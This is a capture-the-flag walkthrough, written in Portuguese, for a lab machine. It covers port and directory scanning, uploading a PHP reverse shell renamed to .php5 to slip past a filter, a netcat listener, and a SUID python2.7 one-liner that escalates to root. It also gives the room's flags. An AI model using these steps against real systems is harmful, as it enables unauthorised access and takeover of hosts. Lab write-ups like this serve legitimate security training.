# TASK2

## Scan the machine, how many ports are open?

Executar nmap -T4 10.65.159.55   
2 portas
22/tcp open  ssh
80/tcp open  http

## What version of Apache is running?

2.4.41

## What service is running on port 22?

ssh

## What is the hidden directory?

└─$ gobuster dir -u http://10.65.159.55 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.159.55
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
css                  (Status: 301) [Size: 310] [--> http://10.65.159.55/css/]
index.php            (Status: 200) [Size: 616]
js                   (Status: 301) [Size: 309] [--> http://10.65.159.55/js/]
panel                (Status: 301) [Size: 312] [--> http://10.65.159.55/panel/]
server-status        (Status: 403) [Size: 277]
uploads              (Status: 301) [Size: 314] [--> http://10.65.159.55/uploads/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

# TASK3

## Find a form to upload and get a reverse shell, and find the flag.

- baixar o shell reverso php https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

- rodar ifconfig para obter meu ip

- atutualizar o arquivo com o meu ip

- trocar a extensão do arquivo para php5

- fazer upload do arquivo no site em /panel

- rodar o comanho no terminal para escutar a porta 1234
    - nc -l -v -n -p 1234  

- abrir o arquivo upado em /uploads

- navegar até a flag
    - cd /var/www
    - cat user.txt
    - THM{y0u_g0t_a_sh3ll}

# TASK 4

## Now that we have a shell, let's escalate our privileges to root.

## Search for files with SUID permission, which file is weird?

- navegar até o /

- procurar por arquivos com permissão 4000, ou seja, arquivos que quando o usuário executa o programa tem permissão de rool
    - find / -perm -4000 -type f 2>/dev/null
    - os erros são descartados

- encontramos o python /usr/bin/python2.7 

## Find a form to escalate your privileges.

Podemos escalar os privilégios executando o python

##

- /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

- entramos no diretório /root

- cat root.txt

- THM{pr1v1l3g3_3sc4l4t10n}
